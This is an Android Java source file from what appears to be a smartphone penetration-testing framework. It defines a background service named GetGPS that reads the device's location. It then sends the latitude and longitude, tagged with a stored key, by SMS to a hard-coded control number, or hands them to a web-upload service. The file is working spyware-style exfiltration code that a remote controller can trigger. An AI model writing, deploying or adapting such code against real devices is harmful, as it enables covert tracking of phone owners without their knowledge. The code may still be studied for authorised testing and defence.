package com.bulbsecurity.framework;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;
import android.widget.Toast;

public class GetGPS extends Service implements LocationListener{
	private LocationManager lm;
	private String gpsstring;
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	@Override
	public void onStart(Intent intent, int startID) {
		 
		String ret = intent.getStringExtra("returnmethod");
		String sms = "SMS";
		String web = "WEB";
		gpsstring = "GPS:";
		double lat;
		double lon;
		LocationManager locationManager = (LocationManager)getSystemService (LOCATION_SERVICE);
	    Criteria criteria = new Criteria ();
	    String bestProvider = locationManager.getBestProvider (criteria, false);
	    Location location = locationManager.getLastKnownLocation (bestProvider);
	    location = locationManager.getLastKnownLocation (bestProvider);   
        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 500, 1, this);

	    try
	    {
	      lat = location.getLatitude();
	      lon = location.getLongitude();
	    }
	    catch (NullPointerException e)
	    {
	      lat = -1.0;
	      lon = -1.0;
	    }
	    String loc = "lat: " + lat + " " + "lon: " + lon;
	    gpsstring = gpsstring.concat(loc);
	    if (ret != null)
		{
			if (ret.equals(sms))
			{

				Intent intent3 = new Intent(getApplicationContext(), SMSService.class);
				//String number2 = ((AndroidAgent)this.getApplication()).getcontrolNumber();
				//String key = ((AndroidAgent)this.getApplication()).getkey();
				String key = getApplicationContext().getResources().getString(R.string.key);
				String number2 = getApplicationContext().getResources().getString(R.string.controlnumber);
				String first = key.concat(" ");
				String allgpss = first.concat(gpsstring);
				intent3.putExtra("number", number2);
				intent3.putExtra("message", allgpss);
				Context context = getApplicationContext();
				context.startService(intent3);
				
			}
			else if (ret.equals(web))
			{
				Intent intent2 = new Intent(getApplicationContext(), WebUploadService.class);
				intent2.putExtra("uploadstring", gpsstring);
				Context context = getApplicationContext();
				context.startService(intent2);
			}

		}
	}

	public void onLocationChanged(Location location) {
		// TODO Auto-generated method stub
		
	}
	public void onProviderDisabled(String provider) {
		// TODO Auto-generated method stub
		
	}
	public void onProviderEnabled(String provider) {
		// TODO Auto-generated method stub
		
	}
	public void onStatusChanged(String provider, int status, Bundle extras) {
		// TODO Auto-generated method stub
		
	}
}
